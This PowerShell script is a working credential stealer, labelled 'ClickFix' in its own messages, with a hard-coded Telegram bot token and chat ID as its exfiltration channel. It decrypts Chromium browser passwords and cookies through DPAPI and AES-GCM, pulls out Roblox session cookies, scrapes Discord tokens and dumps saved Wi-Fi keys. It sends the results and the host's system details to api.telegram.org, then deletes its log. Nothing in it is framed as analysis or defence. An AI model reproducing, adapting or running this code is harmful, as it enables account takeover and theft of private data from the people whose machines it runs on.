$tgToken = "8827121220:AAHL7S675bKJdGcFlUULSUlNWOgGPfSla4U"
$tgChat = "-1003960241194"

$ScriptDir = Split-Path $MyInvocation.MyCommand.Path -Parent
$logFile = "$env:TEMP\cf_$([System.IO.Path]::GetRandomFileName()).txt"
function log($m) { try { $m | Out-File $logFile -Append } catch {} }

$tgBase = "https://api.telegram.org/bot$tgToken"
function ts($m) {
  log "[SEND] $m"
  $b = @{chat_id=$tgChat;text=$m;parse_mode="HTML";disable_web_page_preview=$true} | ConvertTo-Json
  $ok = $false
  for ($i = 0; $i -lt 3 -and !$ok; $i++) {
    try { Invoke-RestMethod -Uri "$tgBase/sendMessage" -Method Post -Body $b -ContentType "application/json" -TimeoutSec 15 -ErrorAction Stop | Out-Null; $ok = $true; break }
    catch { if ($i -ge 2) { break }; Start-Sleep -Seconds 2 }
  }
  if (!$ok) {
    try { $b2 = [Text.Encoding]::UTF8.GetBytes($b); [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $r = [Net.WebRequest]::Create("$tgBase/sendMessage"); $r.Method = "POST"; $r.ContentType = "application/json"; $r.ContentLength = $b2.Length; $s = $r.GetRequestStream(); $s.Write($b2, 0, $b2.Length); $s.Close(); $r.GetResponse() | Out-Null } catch {}
  }
  Start-Sleep -Milliseconds 500
}

ts "[+] Phase 1/5 - Starting ClickFix"

try {
  $ip = try { (Invoke-WebRequest -Uri "https://api.ipify.org" -TimeoutSec 10 -UseBasicParsing).Content } catch { try { (New-Object Net.WebClient).DownloadString("https://api.ipify.org") } catch { "Unknown" } }
  $os = try { (Get-WmiObject Win32_OperatingSystem).Caption } catch { (Get-CimInstance Win32_OperatingSystem).Caption }
  $cpu = try { (Get-WmiObject Win32_Processor).Name } catch { "Unknown" }
  $ram = try { [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 0) } catch { 0 }
  $user = $env:USERNAME
  $comp = $env:COMPUTERNAME
  $dom = $env:USERDOMAIN
  ts "[+] System: $user@$comp ($dom) | IP: $ip | OS: $os | CPU: $cpu | RAM: ${ram}GB"
} catch { ts "[!] System info error: $_" }

ts "[+] Phase 2/5 - Cryptography module"

try {
  Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class N {
[DllImport("crypt32.dll")] public static extern bool CryptUnprotectData(ref D pIn, IntPtr a, IntPtr b, IntPtr c, IntPtr d, uint f, ref D pOut);
[DllImport("kernel32.dll")] public static extern IntPtr LocalFree(IntPtr h);
[DllImport("bcrypt.dll", EntryPoint="BCryptOpenAlgorithmProvider")] public static extern int BOpen(out IntPtr h, string a, string b, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptCloseAlgorithmProvider")] public static extern int BClose(IntPtr h, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptSetProperty")] public static extern int BSetP(IntPtr h, string p, byte[] v, uint l, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptGenerateSymmetricKey")] public static extern int BGenKey(IntPtr ha, out IntPtr hk, byte[] ko, uint kol, byte[] s, uint sl, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptDestroyKey")] public static extern int BDesKey(IntPtr h);
[DllImport("bcrypt.dll", EntryPoint="BCryptDecrypt")] public static extern int BDec(IntPtr hk, byte[] inp, uint il, ref A ai, byte[] iv, uint ivl, byte[] op, uint ol, out uint rl, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptGetProperty")] public static extern int BGetP(IntPtr h, string p, byte[] o, uint ol, out uint rl, uint f);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_open(string f, out IntPtr d);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_close(IntPtr d);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_prepare_v2(IntPtr d, string sql, int n, out IntPtr s, IntPtr t);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_step(IntPtr s);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_finalize(IntPtr s);
[DllImport("winsqlite3.dll")] public static extern IntPtr sqlite3_column_blob(IntPtr s, int c);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_column_bytes(IntPtr s, int c);
[DllImport("winsqlite3.dll", CharSet=CharSet.Ansi)] public static extern IntPtr sqlite3_column_text(IntPtr s, int c);
public struct D { public uint l; public IntPtr p; }
public struct A { public uint s; public uint v; public IntPtr n; public uint nl; public IntPtr ad; public uint adl; public IntPtr tg; public uint tl; public IntPtr mc; public uint mcl; public uint f; public IntPtr r; public uint rl; }
public static byte[] DPD(byte[] d) {
D i=new D{l=(uint)d.Length,p=Marshal.AllocHGlobal(d.Length)};
Marshal.Copy(d,0,i.p,d.Length); D o=new D();
bool ok=CryptUnprotectData(ref i,IntPtr.Zero,IntPtr.Zero,IntPtr.Zero,IntPtr.Zero,1,ref o);
Marshal.FreeHGlobal(i.p); if(!ok)return null;
byte[] r=new byte[o.l]; Marshal.Copy(o.p,r,0,(int)o.l); LocalFree(o.p); return r; }
public static byte[] AG(byte[] k, byte[] n, byte[] c, byte[] t) {
IntPtr ha; int ret=BOpen(out ha,"AES",null,0); if(ret!=0)return null;
byte[] g=Encoding.ASCII.GetBytes("GCM\0"); BSetP(ha,"ChainingMode",g,4,0);
byte[] ob=new byte[4]; uint ol=0; BGetP(ha,"ObjectLength",ob,4,out ol,0);
byte[] ko=new byte[ol]; IntPtr hk;
ret=BGenKey(ha,out hk,ko,ol,k,(uint)k.Length,0); if(ret!=0){BClose(ha,0);return null;}
A ai=new A(); ai.s=(uint)Marshal.SizeOf(typeof(A)); ai.v=1;
IntPtr np=Marshal.AllocHGlobal(n.Length); Marshal.Copy(n,0,np,n.Length); ai.n=np; ai.nl=(uint)n.Length;
IntPtr tp=Marshal.AllocHGlobal(t.Length); Marshal.Copy(t,0,tp,t.Length); ai.tg=tp; ai.tl=(uint)t.Length;
byte[] op=new byte[c.Length]; uint rl=0;
ret=BDec(hk,c,(uint)c.Length,ref ai,null,0,op,(uint)op.Length,out rl,0);
Marshal.FreeHGlobal(np); Marshal.FreeHGlobal(tp);
BDesKey(hk); BClose(ha,0); if(ret!=0)return null;
Array.Resize(ref op,(int)rl); return op; } }
"@
  ts "[+] C# module compiled OK"
} catch { ts "[!] Add-Type failed: $_"; log "[ADD-TYPE ERROR] $_"; exit }

$chromeKey = $null
try {
  $lsPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
  if (Test-Path $lsPath) {
    $lsJson = Get-Content $lsPath -Raw | ConvertFrom-Json
    $encKey = $lsJson.os_crypt.encrypted_key
    if ($encKey) {
      $raw = [Convert]::FromBase64String($encKey)
      $dpapiBlob = $raw[5..($raw.Length - 1)]
      $chromeKey = [N]::DPD($dpapiBlob)
      if ($chromeKey) { ts "[+] Chrome master key decrypted ($($chromeKey.Length) bytes)" }
      else { ts "[!] Failed to decrypt Chrome master key" }
    }
  } else { log "[!] Chrome Local State not found at $lsPath" }
} catch { ts "[!] Chrome key error: $_" }

try {
  $pwCount = 0; $ckCount = 0; $histCount = 0; $robCookie = $null
  $browsers = @(
    @("Chrome", "$env:LOCALAPPDATA\Google\Chrome\User Data"),
    @("Edge", "$env:LOCALAPPDATA\Microsoft\Edge\User Data"),
    @("Brave", "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data")
  )

  foreach ($browser in $browsers) {
    $bName = $browser[0]; $basePath = $browser[1]
    if (!(Test-Path $basePath)) { continue }
    $profiles = @("Default")
    try { Get-ChildItem "$basePath\Profile *" -Directory -ErrorAction SilentlyContinue | ForEach-Object { $profiles += $_.Name } } catch {}

    foreach ($profile in $profiles) {
      $loginDb = "$basePath\$profile\Login Data"
      $cookieDb = "$basePath\$profile\Network\Cookies"
      $historyDb = "$basePath\$profile\History"

      if (Test-Path $loginDb) {
        try {
          $tmpDb = "$env:TEMP\ld_$([System.IO.Path]::GetRandomFileName()).db"
          Copy-Item $loginDb $tmpDb -Force -ErrorAction Stop
          $dbPtr = [IntPtr]::Zero
          if ([N]::sqlite3_open($tmpDb, [ref]$dbPtr) -eq 0) {
            $stmt = [IntPtr]::Zero
            if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT origin_url, username_value, password_value FROM logins", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
              while ([N]::sqlite3_step($stmt) -eq 100) {
                $encLen = [N]::sqlite3_column_bytes($stmt, 2)
                $encPtr = [N]::sqlite3_column_blob($stmt, 2)
                if ($encLen -gt 15 -and $encPtr -ne [IntPtr]::Zero -and $chromeKey -ne $null) {
                  $enc = New-Object byte[] $encLen
                  [Runtime.InteropServices.Marshal]::Copy($encPtr, $enc, 0, $encLen)
                  $nonce = $enc[3..14]
                  $ctLen = $encLen - 31
                  if ($ctLen -gt 0) {
                    $ct = $enc[15..(14 + $ctLen)]
                    $tag = $enc[(15 + $ctLen)..($encLen - 1)]
                    $dec = [N]::AG($chromeKey, $nonce, $ct, $tag)
                    if ($dec -ne $null) { $pwCount++ }
                  }
                }
              }
              [N]::sqlite3_finalize($stmt)
            }
            [N]::sqlite3_close($dbPtr)
          }
          Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
        } catch { log "[!] Login DB error $bName/$profile : $_" }
      }

      if (Test-Path $cookieDb) {
        try {
          $tmpDb = "$env:TEMP\ck_$([System.IO.Path]::GetRandomFileName()).db"
          Copy-Item $cookieDb $tmpDb -Force -ErrorAction Stop
          $dbPtr = [IntPtr]::Zero
          if ([N]::sqlite3_open($tmpDb, [ref]$dbPtr) -eq 0) {
            $stmt = [IntPtr]::Zero
            if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT host_key, name, encrypted_value FROM cookies", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
              while ([N]::sqlite3_step($stmt) -eq 100) {
                $hostPtr = [N]::sqlite3_column_text($stmt, 0)
                $namePtr = [N]::sqlite3_column_text($stmt, 1)
                $encLen = [N]::sqlite3_column_bytes($stmt, 2)
                $encPtr = [N]::sqlite3_column_blob($stmt, 2)
                if ($encLen -gt 15 -and $encPtr -ne [IntPtr]::Zero -and $chromeKey -ne $null) {
                  $enc = New-Object byte[] $encLen
                  [Runtime.InteropServices.Marshal]::Copy($encPtr, $enc, 0, $encLen)
                  $nonce = $enc[3..14]
                  $ctLen = $encLen - 31
                  if ($ctLen -gt 0) {
                    $ct = $enc[15..(14 + $ctLen)]
                    $tag = $enc[(15 + $ctLen)..($encLen - 1)]
                    $dec = [N]::AG($chromeKey, $nonce, $ct, $tag)
                    if ($dec -ne $null) {
                      $ckCount++
                      $cName = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($namePtr)
                      $cHost = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($hostPtr)
                      if (($cName -eq ".ROBLOSECURITY" -or $cName -eq "ROBLOSECURITY") -and $cHost.Contains("roblox.com")) {
                        $robCookie = [System.Text.Encoding]::UTF8.GetString($dec)
                      }
                    }
                  }
                }
              }
              [N]::sqlite3_finalize($stmt)
            }
            [N]::sqlite3_close($dbPtr)
          }
          Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
        } catch { log "[!] Cookie DB error $bName/$profile : $_" }
      }

      if (Test-Path $historyDb) {
        try {
          $tmpDb = "$env:TEMP\hist_$([System.IO.Path]::GetRandomFileName()).db"
          Copy-Item $historyDb $tmpDb -Force -ErrorAction Stop
          $dbPtr = [IntPtr]::Zero
          if ([N]::sqlite3_open($tmpDb, [ref]$dbPtr) -eq 0) {
            $stmt = [IntPtr]::Zero
            if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT COUNT(*) FROM urls", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
              if ([N]::sqlite3_step($stmt) -eq 100) {
                $cntPtr = [N]::sqlite3_column_text($stmt, 0)
                if ($cntPtr -ne [IntPtr]::Zero) {
                  $histCount += [int][Runtime.InteropServices.Marshal]::PtrToStringAnsi($cntPtr)
                }
              }
              [N]::sqlite3_finalize($stmt)
            }
            [N]::sqlite3_close($dbPtr)
          }
          Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
        } catch { log "[!] History DB error $bName/$profile : $_" }
      }
    }
  }

  ts "[+] Passwords: $pwCount | Cookies: $ckCount | History: $histCount"
  if ($robCookie) { ts "[+] Roblox: $robCookie" } else { ts "[-] No Roblox cookie" }
} catch { ts "[!] Browser scanning error: $_" }

try {
  ts "[+] Phase 3/5 - Discord tokens"
  $dcDirs = @("$env:APPDATA\discord", "$env:APPDATA\discordcanary", "$env:APPDATA\discordptb", "$env:APPDATA\discorddevelopment")
  $tokens = @()
  $dcRegex = [regex]'[MN][A-Za-z0-9_-]{23,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}'
  foreach ($d in $dcDirs) {
    $ldbPath = "$d\Local Storage\leveldb"
    if (Test-Path $ldbPath) {
      Get-ChildItem $ldbPath -Include *.ldb, *.log -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
        $content = try { Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue } catch { $null }
        if ($content) {
          $dcRegex.Matches($content) | ForEach-Object {
            if ($tokens -notcontains $_.Value) { $tokens += $_.Value }
          }
        }
      }
    }
  }
  if ($tokens.Count -gt 0) { ts "[+] Discord ($($tokens.Count)): $($tokens -join '`n')" } else { ts "[-] No Discord tokens" }
} catch { ts "[!] Discord scan error: $_" }

try {
  ts "[+] Phase 4/5 - WiFi"
  $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
  $wifiList = @()
  foreach ($ssid in $wifiProfiles) {
    $detail = netsh wlan show profile name="$ssid" key=clear
    $pw = $detail | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
    $wifiList += "$ssid : $pw"
  }
  if ($wifiList.Count -gt 0) { ts "[+] WiFi ($($wifiList.Count)): $($wifiList -join '; ')" }
  else { ts "[-] No WiFi profiles" }
} catch { ts "[!] WiFi error: $_" }

ts "[+] Phase 5/5 - Done"
if (Test-Path $logFile) { try { Remove-Item $logFile -Force -ErrorAction SilentlyContinue } catch {} }
